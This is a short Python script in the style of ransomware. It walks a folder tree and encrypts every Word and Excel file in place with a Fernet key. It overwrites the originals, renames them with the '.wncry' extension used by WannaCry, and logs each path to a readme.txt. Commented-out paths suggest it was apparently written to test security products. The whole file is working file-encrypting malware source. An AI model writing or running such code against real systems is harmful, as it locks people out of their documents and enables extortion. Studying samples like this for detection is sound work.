from cryptography.fernet import Fernet
import os

def encfile(encfile):
    #key generation
    if(os.path.isfile('filekey.key')):
        with open('filekey.key','rb') as filekey:
            key = filekey.read()
    else:
        key = Fernet.generate_key()

    #using the gerated key
    fernet = Fernet(key)

    #string the key in the file
    with open ('filekey.key','wb') as filekey:
        filekey.write(key)

    #opening the original file to encrypt
    with open (encfile,'rb') as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    #write the encrypted data
    with open(encfile,'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    #rename file
    newfile=encfile+".wncry"
    os.renames(encfile,newfile)
def encS(path):
    for (root, dirs, file) in os.walk(path):
        for f in file:
            fpath = ""
            if (str(root).endswith("//")):
                fpath = str(root) + str(f)
            else:
                fpath = (str(root) + "//" + str(f)).replace("\\", "//")
            tmp = "encrypted: " + fpath+"\n"
            with open(path+'//'+'readme.txt','a') as tfile:
                tfile.write(tmp)
            if(fpath.endswith("doc") or fpath.endswith("docx") or fpath.endswith("xls") or fpath.endswith("xlsx")):
                print(fpath)
                encfile(fpath)

#encfile('S://test//file-sample_100kB.docx')
#encS("C://syvtit-testing-trendmicro")
encS("S://test")
#encS("D://Python//Python-2024//Encryption//Samples")